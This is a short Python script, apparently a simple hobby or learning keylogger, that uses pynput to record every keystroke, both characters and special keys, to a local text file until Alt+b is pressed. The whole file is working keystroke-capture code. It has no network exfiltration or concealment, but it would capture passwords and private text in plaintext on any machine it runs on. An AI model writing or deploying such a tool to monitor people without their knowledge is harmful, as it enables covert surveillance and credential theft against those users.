import os
from pynput import keyboard
#stops when Alt and b are pressed
# File to store key logs
log_file = "KeyRecordFileLogged.txt"

# Delete the file if it exists; recreate it
if os.path.exists(log_file):
    os.remove(log_file)

with open(log_file, "w") as f:
    f.write("")  # Create an empty file

# Variable to track if the Alt key is being held
alt_held = False

def on_press(key):
    global alt_held
    try:
        # Log printable characters
        with open(log_file, "a") as f:
            f.write(f"{key.char}\n")
        if key.char == 'b' and alt_held:  # Check if 'b' is pressed while Alt is held
            return False  # Stop the listener, terminating the program
    except AttributeError:
        # Log special keys
        with open(log_file, "a") as f:
            f.write(f"{key}\n")
        if key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:  # Detect Alt key
            alt_held = True

def on_release(key):
    global alt_held
    # Reset Alt key status when released
    if key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        alt_held = False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()